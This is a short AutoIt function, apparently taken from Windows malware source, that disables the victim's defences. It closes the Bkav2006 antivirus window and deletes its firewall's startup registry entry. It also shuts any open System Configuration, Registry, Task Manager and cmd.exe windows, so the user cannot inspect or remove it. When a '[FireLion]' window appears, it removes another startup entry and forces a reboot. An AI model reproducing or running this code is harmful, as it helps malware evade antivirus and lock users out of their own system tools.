Func KILLPROCESS ( )
	If ProcessExists ( "game_y.exe" ) Then
		ProcessClose ( "game_y.exe" )
	EndIf
	If WinExists ( "Bkav2006" ) Then
		WinClose ( "Bkav2006" )
		RegDelete ( "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" , "BkavFw" )
	EndIf
	If WinExists ( "System Configuration" ) Then
		WinClose ( "System Configuration" )
	EndIf
	If WinExists ( "Registry" ) Then
		WinClose ( "Registry" )
	EndIf
	If WinExists ( "Windows Task" ) Then
		WinClose ( "Windows Task" )
	EndIf
	If WinExists ( "[FireLion]" ) Then
		RegDelete ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" , "IEProtection" )
		Shutdown ( 2 )
	EndIf
	If ProcessExists ( "cmd.exe" ) Then
		ProcessClose ( "cmd.exe" )
	EndIf
EndFunc
